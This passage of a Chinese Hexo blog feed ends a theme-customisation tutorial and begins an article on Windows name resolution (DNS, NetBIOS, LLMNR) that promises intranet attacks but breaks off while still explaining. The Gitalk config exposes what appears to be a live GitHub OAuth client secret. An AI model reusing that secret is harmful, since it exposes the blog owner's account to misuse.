class="hljs yaml"><span class="hljs-attr">jsonContent:</span><br>    <span class="hljs-attr">meta:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">pages:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">posts:</span><br>      <span class="hljs-attr">title:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-attr">date:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-attr">text:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">raw:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">content:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">slug:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">updated:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">comments:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">link:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">permalink:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">excerpt:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">categories:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">tags:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h3 id="在-Hexo-中添加本地图片"><a href="#在-Hexo-中添加本地图片" class="headerlink" title="在 Hexo 中添加本地图片"></a>在 Hexo 中添加本地图片</h3><ul><li>把根目录下 <code>_config.yml</code> 中的 <code>post_asset_folder</code> 选项设置为 <strong>true</strong></li><li>在根目录下执行命令：<code>npm install hexo-asset-image --save</code></li><li>之后再运行 <code>hexo n &quot;xxxx&quot;</code> 新建博文时，<code>/source/_posts</code> 文件夹内除了 <code>xxxx.md</code> 文件还会有一个同名的文件夹，可以将想引入的图片先复制到这个文件夹中，在按照 markdown 的格式引入即可：<code>![img](xxxx/图片名.jpg)</code></li></ul><h3 id="修改代码块样式"><a href="#修改代码块样式" class="headerlink" title="修改代码块样式"></a>修改代码块样式</h3><p>原始的代码块的确不堪入目，我们可以改变配色，使它看起来舒服一些。</p><ul><li>直接修改编译好的文件（<code>theme/yilia/source/main.0cf68a.css</code>）：</li><li>修改代码块背景色，搜索 <code>.article-entry .highlight,</code>，修改background，<strong>推荐色值：#333333</strong></li><li>修改代码字体颜色，搜索 <code>.article-entry .highlight .line</code>，修改color，<strong>推荐色值：#f8f8ff</strong></li><li>修改行号颜色，搜索 <code>.article-entry .highlight .gutter pre .line</code>，修改color，<strong>推荐色值：#5686bf</strong></li></ul><h3 id="访问量的统计和显示"><a href="#访问量的统计和显示" class="headerlink" title="访问量的统计和显示"></a>访问量的统计和显示</h3><p>在 <code>themes/yilia/layout/_partial/after-footer.ejs</code> 中引入脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 添加不蒜子统计</span><br>&lt;script <span class="hljs-keyword">async</span> src=<span class="hljs-string">&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><ul><li><p>统计网站访问总量<br>修改 <code>themes/yilia/layout/_partial/footer.ejs</code>，添加本站总访问量和本站总访客数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"># PV 方式，单个用户连续点击 n 篇，记录 n 次访问值<br>&lt;span id=<span class="hljs-string">&quot;busuanzi_container_site_pv&quot;</span>&gt; Pageviews: <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;busuanzi_value_site_pv&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span> times &lt;/span&gt;              <br># UV 方式，单个用户连续点击 n 篇，记录 <span class="hljs-number">1</span> 次访问值<br>&lt;span <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;post-meta-divider&quot;</span>&gt;|&lt;/span&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;busuanzi_container_site_uv&quot;</span>&gt;</span> Total Visitors: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;busuanzi_value_site_uv&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> persons <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br></code></pre></td></tr></table></figure></li><li><p>单篇文章点击量<br>在 <code>themes/yilia/layout/_partial/article.ejs</code> 的 <code>&lt;%- partial(&#39;post/title&#39;, &#123;class_name: &#39;article-title&#39;&#125;) %&gt;</code> 处插入代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;% <span class="hljs-keyword">if</span> (!index &amp;&amp; post.comments)&#123; %&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cloud-tie-join-count&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:void(0);&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color:gray;font-size:14px;&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon-sort&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;busuanzi_container_page_pv&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color:gray;font-size:14px;&quot;</span>&gt;</span></span><br><span class="xml">阅读数：<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;busuanzi_value_page_pv&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>次</span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br>&lt;% &#125; %&gt;<br></code></pre></td></tr></table></figure></li></ul><h3 id="百度统计配置"><a href="#百度统计配置" class="headerlink" title="百度统计配置"></a>百度统计配置</h3><ul><li>申请账号：<a href="https://tongji.baidu.com/">百度统计官网</a></li><li>在 yilia 文件夹下的 <code>_config.yml</code> 中找到 <code>baidu_analytics</code>，填入 key 即可。</li></ul><h3 id="设置网站-ico"><a href="#设置网站-ico" class="headerlink" title="设置网站 ico"></a>设置网站 ico</h3><ul><li>先到 <a href="https://www.xzlogo.com/">小智LOGO</a> 制作在线 logo</li><li>再到 <a href="http://www.bitbug.net/">比特虫</a> 用做好的 logo 生成 icon 图标（favicon.ico）</li><li>把 icon 图标放到 <code>themes/yilia/source/img</code> 文件夹下，再在 <code>yilia/_config.yml</code> 下引用 <code>favicon: /img/favicon.ico</code> 即可。</li></ul><h3 id="设置-404-页面"><a href="#设置-404-页面" class="headerlink" title="设置 404 页面"></a>设置 404 页面</h3><p>使用 <a href="https://www.qq.com/404/">腾讯公益404</a>，在根目录 <code>source</code> 文件夹下新建 <strong>404.html</strong> 文件，并添加以下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>404<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js&quot;</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span> <span class="hljs-attr">homePageUrl</span>=<span class="hljs-string">&quot;https://ew1z4rd.github.io&quot;</span> <span class="hljs-attr">homePageName</span>=<span class="hljs-string">&quot;回到我的主页&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="添加评论系统"><a href="#添加评论系统" class="headerlink" title="添加评论系统"></a>添加评论系统</h3><ul><li>在 Github 中注册 GitHub Application，具体可参考 <a href="https://www.jianshu.com/p/656e6101bf0f">在个人博客里添加评论系统–Gitalk</a></li><li>在 <code>/theme/yilia/layout/_partial/post/</code> 目录下创建 <code>gitalk.ejs</code> 文件，并添加以下代码：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;div id=<span class="hljs-string">&quot;gitalk-container&quot;</span>&gt;&lt;/div&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;gitalk-container&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;padding: 0px 30px 0px 30px;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="javascript"><span class="xml"><span class="hljs-keyword">if</span>(&lt;%=theme.gitalk.enable%&gt;)&#123;</span></span><br><span class="javascript"><span class="xml">   <span class="hljs-keyword">var</span> gitalk = <span class="hljs-keyword">new</span> Gitalk(&#123;</span></span><br><span class="javascript"><span class="xml">   <span class="hljs-attr">clientID</span>: <span class="hljs-string">&#x27;&lt;%=theme.gitalk.ClientID%&gt;&#x27;</span>,</span></span><br><span class="javascript"><span class="xml">   <span class="hljs-attr">clientSecret</span>: <span class="hljs-string">&#x27;&lt;%=theme.gitalk.ClientSecret%&gt;&#x27;</span>,</span></span><br><span class="javascript"><span class="xml">   <span class="hljs-attr">repo</span>: <span class="hljs-string">&#x27;&lt;%=theme.gitalk.repo%&gt;&#x27;</span>,</span></span><br><span class="javascript"><span class="xml">   <span class="hljs-attr">owner</span>: <span class="hljs-string">&#x27;&lt;%=theme.gitalk.githubID%&gt;&#x27;</span>,</span></span><br><span class="javascript"><span class="xml">   <span class="hljs-attr">admin</span>: [<span class="hljs-string">&#x27;&lt;%=theme.gitalk.adminUser%&gt;&#x27;</span>],</span></span><br><span class="javascript"><span class="xml">   <span class="hljs-attr">id</span>: md5(<span class="hljs-built_in">window</span>.location.pathname),</span></span><br><span class="javascript"><span class="xml">   <span class="hljs-attr">distractionFreeMode</span>: <span class="hljs-string">&#x27;&lt;%=theme.gitalk.distractionFreeMode%&gt;&#x27;</span></span></span><br><span class="javascript"><span class="xml">&#125;)</span></span><br><span class="javascript"><span class="xml">gitalk.render(<span class="hljs-string">&#x27;gitalk-container&#x27;</span>)</span></span><br><span class="javascript"><span class="xml">&#125;</span></span><br><span class="javascript"><span class="xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><ul><li>在 <code>/theme/yilia/layout/_partial/article.ejs</code> 文件中最后一行 <code>&lt;% &#125; %&gt;</code> 之前添加以下内容：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;% <span class="hljs-keyword">if</span>(theme.gitalk.enable &amp;&amp; theme.gitalk.distractionFreeMode)&#123; %&gt;<br>&lt;%- partial(<span class="hljs-string">&#x27;gitalk&#x27;</span>, &#123;<br>    <span class="hljs-attr">key</span>: post.slug,<br>  <span class="hljs-attr">title</span>: post.title,<br>    <span class="hljs-attr">url</span>: config.url+url_for(post.path)<br>&#125;) %&gt;<br>&lt;% &#125; %&gt;<br></code></pre></td></tr></table></figure><ul><li>在 yilia 的配置文件 <code>_config.yml</code> 中 gitment 下面添加以下配置文件：</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Gitalk</span><br><span class="hljs-attr">gitalk:</span> <br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">clientID:</span> <span class="hljs-string">&#x27;690107f290505440a443&#x27;</span>  <span class="hljs-comment">#  Github 生成</span><br>  <span class="hljs-attr">clientSecret:</span> <span class="hljs-string">&#x27;a05e41d3ce002564284f3615e37fec2ea2b0cd51&#x27;</span>  <span class="hljs-comment">#  Github 生成</span><br>  <span class="hljs-attr">repo:</span> <span class="hljs-string">&#x27;ew1z4rd.github.io&#x27;</span>  <span class="hljs-comment"># 用户名.github.io</span><br>  <span class="hljs-attr">owner:</span> <span class="hljs-string">&#x27;ew1z4rd&#x27;</span>  <span class="hljs-comment"># 用户名</span><br>  <span class="hljs-attr">admin:</span> <span class="hljs-string">&#x27;ew1z4rd&#x27;</span>  <span class="hljs-comment"># 用户名</span><br>  <span class="hljs-attr">distractionFreeMode:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h3 id="关于-litten-me-9005"><a href="#关于-litten-me-9005" class="headerlink" title="关于 litten.me:9005"></a>关于 litten.me:9005</h3><p>主题作者为了更好地完善这个主题，有时会收集用户的客户端信息，目前作者关闭了服务器，这个脚本会导致博客持续加载，解决方法是将 <code>themes/yilia/source/main.0cf68a.js</code> 里面的 <code>//litten.me:9005/badjs/</code> 注释掉，详情见：<a href="https://github.com/litten/hexo-theme-yilia/issues/580">https://github.com/litten/hexo-theme-yilia/issues/580</a></p><h2 id="Hexo-使用"><a href="#Hexo-使用" class="headerlink" title="Hexo 使用"></a>Hexo 使用</h2><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><p>tag 对应的是文章的标签，在需要标识多个标签时，使用如下语法：<code>tags: [tag1, tag2, tag3]</code></p><h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><p>如果不使用文章截断，会默认在主页显示整篇文章，可以在 md 文件中需要做截断的地方使用 <code>&lt;!--more--&gt;</code> 标记。</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo new &quot;postName&quot;  # 新建文章<br>hexo new page &quot;pageName&quot;  # 新建页面<br>hexo clean  # 清除缓存文件和静态文件（public）<br>hexo generate  # 生成静态页面至 public 目录<br>hexo server  # 在本地服务器运行<br>hexo deploy  # 将.deploy_git 目录部署到 GitHub<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 简写：</span><br>hexo n == hexo new<br>hexo g == hexo generate<br>hexo s == hexo server<br>hexo d == hexo deploy<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 常用复合命令：</span><br>hexo d -g<br>hexo s -g<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows 名称解析机制探究及缺陷利用</title>
    <link href="/post/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6%E5%8F%8A%E7%BC%BA%E9%99%B7%E5%88%A9%E7%94%A8/"/>
    <url>/post/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6%E5%8F%8A%E7%BC%BA%E9%99%B7%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>本文阐述了 Windows 系统中的名称解析机制，同时也提及了几种利用名称解析机制的缺陷进行内网攻击的方式。</p><h2 id="0x00-Windows-名称解析简介"><a href="#0x00-Windows-名称解析简介" class="headerlink" title="0x00 Windows 名称解析简介"></a>0x00 Windows 名称解析简介</h2><p>TCP 协议的通信是基于 IP 地址的，“名称解析” 就是把需要访问的计算机的名字解析为 IP 地址的过程。</p><p><strong>Windows 中的名称类型</strong></p><p>在 Windows 操作系统中有两种名称，分别为：<strong>主机名称</strong> 和 <strong>NetBIOS 名称</strong>。</p><p><strong>主机名称</strong></p><p>从狭义上来说，主机名称正如它的字面意思一样就是一台主机的名字；从广义来说，它又不仅仅包含计算机的名字，也包含互联网中的域名。</p><p>由于域名是以树状的形式所表现的，同时也是主机名称的一种，所以主机名称是有层次的，最大长度为 255 个字符，允许的字符有 <code>A～Z</code>，<code>a～z</code> 和 <code>-</code>。在域名系统中有一种标识一台主机的 DNS 名字的域名叫做 <strong>FQDN（Fully Qualified Domain Name，全限定域名）</strong>，从全限定域名中包含的信息可以准确看出主机在域名树中的位置。</p><blockquote><p>FQDN 是一种同时带有主机名和域名的名称，含义是完整的域名。<code>FQDN = Hostname + DomainName</code>。例如，主机名是 test，域名是 example.com，则该主机的 FQDN = test.example.com。</p></blockquote><p><strong>NetBIOS 名称</strong></p><p>在 Windows 系统中使用的另外一种名称就是 NetBIOS 名称，准确的说 NetBIOS 名称并非是一种名字系统，而是 Windows 操作系统网络的一个编程接口，允许主机之间使用 NetBIOS 名称进行通信，通信过程是建立在 NetBIOS 协议之上的。在安装完 Windows 系统后系统会默认使用计算机的名字做为当前主机的 NetBIOS 名称。它的最大长度为 16 个字符，其中最后一位是不可配置的，用于指定 NetBIOS 的服务类型。如果计算机名称不足 15 位则使用空格补全到 15 位，反之，如果计算机名称超过 15 位则会截取前 15 位。常见的 NetBIOS 后缀有 0x20（文件和打印服务）、0x00（工作站服务）、0x03（报信者服务） 等。</p><blockquote><p> 使用 nbtstat -n 命令查看本机的 NetBIOS 名称。<br>使用 nbtstat -A ipaddress 命令查看指定 IP 主机的 NetBIOS 名称。</p></blockquote><h2 id="0x01-Windows-名称解析相关协议"><a href="#0x01-Windows-名称解析相关协议" class="headerlink" title="0x01 Windows 名称解析相关协议"></a>0x01 Windows 名称解析相关协议</h2><p>在 Windows 系统中有三种与名称解析相关的协议。</p><h3 id="DNS-协议"><a href="#DNS-协议" class="headerlink" title="DNS 协议"></a>DNS 协议</h3><p>DNS 协议是一种最主要的也是操作系统首选的进行名称解析的协议，几乎每一种操作系统都支持 DNS 协议，同时， DNS 协议支持 IPv4 和 IPv6。DNS 协议在实现名称解析的过程中，在客户机上没有任何本地的数据库文件，完全依赖于 DNS 服务器，所监听的端口是 UDP/53 。</p><blockquote><p>使用 ipconfig /displaydns 命令来查看本机的 DNS 缓存。<br>使用 ipconfig /flushdns 命令清除本机的 DNS 缓存。</p></blockquote><p>DNS 的名称解析过程如下：</p><ul><li>读取本机 DNS 缓存（包含本机 hosts 文件）；</li><li>如果缓存中没有，则会请求网络配置中配置的 DNS 服务器；</li><li>如果 DNS 服务器未作出响应，则请求失败；反之，DNS 服务器会处理用户请求。</li></ul><blockquote><p>hosts 文件位于 C:\Windows\System32\drivers\etc\hosts，用于提供主机名到 IP 地址的解析 。</p></blockquote><h3 id="NetBIOS-协议"><a href="#NetBIOS-协议" class="headerlink" title="NetBIOS 协议"></a>NetBIOS 协议</h3><p>除了 DNS 之外，在早先版本的 Windows 中也使用 <strong>NetBIOS（Network Basic Input/Output System，网络基本输入输出系统）</strong>进行名称解析。本文介绍的 NetBIOS 协议名称解析是微软后来定义的 <strong>NBT（ NetBIOS over TCP/IP）</strong>的名称解析类型。</p><p>NBT 服务监听的端口为 UDP/137，其进行名称解析的形式为向当前主机所在的子网域发送广播包。所以，当你使用抓包工具在局域网中抓包时总会收到很多 <strong>NBNS 数据包</strong>。</p><blockquote><p>NBNS（NetBIOS Name Service，NetBIOS 域名服务器），类似于 TCP/IP 协议中的 DNS，它负责查找目标机器相应的节点地址（TCP/IP协议中为IP地址），并赋予一个 NetBIOS 名称。</p></blockquote><p>由于 NetBIOS 协议进行名称解析是发送的 <strong>UDP 广播包</strong>，这样做虽然速度快且无需额外的配置，但是广播包不能跨越网域同时也会增加一些网络流量，因此微软在后来推出了 <strong>WINS（Windows Internet Name Service，Windows 网络名称服务）</strong>服务器，当计算机配置为使用 WINS 服务器进行名称解析时，客户机将直接和 WINS 服务器进行 <strong>单播</strong> 通讯，这样就可以弥补 NetBIOS 协议使用广播进行名称解析的不足。</p><p>综上所述，NetBIOS 协议进行名称解析的过程如下：</p><ul><li>检查本地 NetBIOS 缓存；</li><li>如果缓存中没有请求的名称且已配置了 WINS 服务器，接下来则会向 WINS 服务器发出请求；</li><li>如果没有配置 WINS 服务器或 WINS 服务器无响应则会向当前子网域发送广播；</li><li>如果发送广播后无任何主机响应则会读取本地的 lmhosts 文件。</li></ul><blockquote><p>lmhosts 文件位于 C:\Windows\System32\drivers\etc\lmhosts.sam，用于把 NetBIOS 名字映射到IP地址。</p><p>使用 nbtstat -c 命令查看本机的 NetBIOS 缓存。<br>使用 nbtstat -R 命令清除本机的 NetBIOS 缓存。</p></blockquote><h3 id="LLMNR-协议"><a href="#LLMNR-协议" class="headerlink" title="LLMNR 协议"></a>LLMNR 协议</h3><p>DNS 协议的名称解析虽然高效但是需要在局域网中单独配置一台服务器作为 DNS 服务器，NetBIOS 协议的名称解析在一些情况下也需要单独配置一台 WINS 服务器，而且 NetBIOS 协议不支持 IPv6。因此，为了弥补这些不足，微软在 Windows Vista 之后推出了基于端到端的名称解析协议，即 <strong>LLMNR（Link-Local Multicast Name Resolution，本地链路多播名称解析）</strong>。</p><p>LLMNR 也称作多播 DNS ，因为其数据包格式类似于 DNS 的数据包。其监听的端口为 UDP/5355，支持 IPv4 和 IPv6 ，IPv4 的组播地址为 224.0.0.252，IPv6 的组播地址为 FF02:0:0:0:0:0:1:3 或 FF02::1:3，并且在 Linux 上也实现了此协议。其解析名称的特点是提供了 <strong>点对点</strong> 的名称解析服务，可以让同一子网中的 IPv4 和 IPv6 设备不需要  WINS 或 DNS 服务器就可以解析对方的名称。</p><p>LLMNR 主要用于在网络出现故障的情况下（如 DNS 服务器不可用时）提供名称解析，此外在建立临时对等网络（例如，机场候机区域）方面也非常有用。</p><p><img src="/img/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6%E5%8F%8A%E7%BC%BA%E9%99%B7%E5%88%A9%E7%94%A8/2019-08-06_094123.png" alt="Windows 名称解析过程"></p><p>LLMNR 进行名称解析的过程为：</p><ul><li>检查本地 NetBIOS 缓存；</li><li>如果缓存中没有则会向当前子网域（也就是本地链路）发送 UDP 广播，查询主机名对应的 IP 地址；</li><li>当前子网域的其他主机收到广播包后，将查询的名称和自己的主机名进行比较，如果找到了匹配的主机名，这台计算机会传输一条包含了自己 IP 地址的单播信息给请求该查询的主机，如果没有找到则丢弃这个查询；</li><li>如果发送广播后无任何主机响应则请求失败。</li></ul><h2 id="0x02-Windows-系统名称解析顺序"><a href="#0x02-Windows-系统名称解析顺序" class="headerlink" title="0x02 Windows 系统名称解析顺序"></a>0x02 Windows 系统名称解析顺序</h2><p>影响 Windows 系统名称解析的两个因素，分别是：<strong>操作系统版本</strong> 和 <strong>网络节点模式</strong>。</p><h3 id="操作系统版本"><a href="#操作系统版本" class="headerlink" title="操作系统版本"></a>操作系统版本</h3><p>从上述一小节中，可以发现并非所有的操作系统版本都支持上述三种协议。</p><p>Windows 2K，XP，2K3 只支持 DNS 和 NetBIOS。 所以此类版本的 Windows 都是先进行 DNS 名称解析，如果 DNS 解析名称失败，才会进行 NetBIOS 名称解析。</p><p>Windows Vista 之后（包括 2K8，Win7，Win8.x，Win10）都支持上述三种协议，在这类 Windows系统中的名称解析顺序为：先进行 DNS 名称解析，如果 DNS 解析名称失败，则会使用 LLMNR 进行名称解析，最后才会使用 NetBIOS 名称解析。</p><h3 id="网络节点模式"><a href="#网络节点模式" class="headerlink" title="网络节点模式"></a>网络节点模式</h3><p>还有一种影响 Windows 系统名称解析的一个因素就是当前主机的网络节点模式。</p><blockquote><p> 使用 ipconfig /all命令查看本机的网络节点模式。</p></blockquote><p>网络节点模式主要会 <strong>影响 NetBIOS 名称解析过程</strong>，是优先查询 WINS 服务器还是先在子网域中进行广播。具体的节点模式描述如下：</p><ul><li>B-节点（broadcast，广播）</li></ul><p>Windows 使用广播来进行名称注册和名称解析，依据网关的配置，一个 B 节点客户机发送的数据包不能够超出局域网的范围，因此 B 节点并不适合于大型网络。实际上微软修改了标准的 B 节点类型，当 Windows 尝试解析名称时，首先检查 LMHOSTS 名称缓存，如果缓存中没有则会向当前子网发送广播，如果广播依然失败的话，Windows 才会检查实际的 LMHOSTS 文件。</p><ul><li>P-节点（per-to-per，对等）</li></ul><p>这种方法不使用广播，而是在计算机启动时，在网络中的 WINS 服务器上注册它们的名称。当计算机需要解析名称时，它会发送一个解析请求给 WINS 服务器。这种方法只在 WINS 服务器正常运行时有效，如果 WINS 服务器失败，则无法进行名称解析。</p><ul><li>M-节点（mixed，混合）</li></ul><p>Windows 联合使用 B 节点和 P 节点，并且默认使用 B 节点，如果 M 节点不能利用广播进行名称解析，它就使用 P 节点的 WINS 服务器来完成工作。</p><ul><li>H-节点（hybrid，混合）</li></ul><p>同样也是联合使用 B 节点和 P 节点，但工作方式相反，如果使用 WINS 服务器方式不能成功，则使用 B 节点的工作来完成工作。此节点模式也是目前 Windows 系统 <strong>默认使用</strong> 的节点模式。</p><p>综上所述，一种常用的 Windows 名称解析的过程为：</p><ol><li>检查所解析名称是否是本机；</li><li>尝试通过 DNS 缓存进行名称解析；</li><li>尝试通过 hosts 文件进行名称解析；</li><li><strong>尝试将查询请求发送到指定的 DNS 服务器；</strong></li><li>尝试通过 NetBIOS 名称缓存；</li><li><strong>尝试使用 LLMNR 进行名称解析；</strong></li><li><strong>尝试将 NetBIOS 查询请求发送到指定的 WINS 服务器；</strong></li><li><strong>尝试通过广播进行 NetBIOS 名称解析；</strong></li><li>尝试通过 lmhosts 文件进行名称解析。</li></ol><p>值得重点关注的是 4、6、7、8 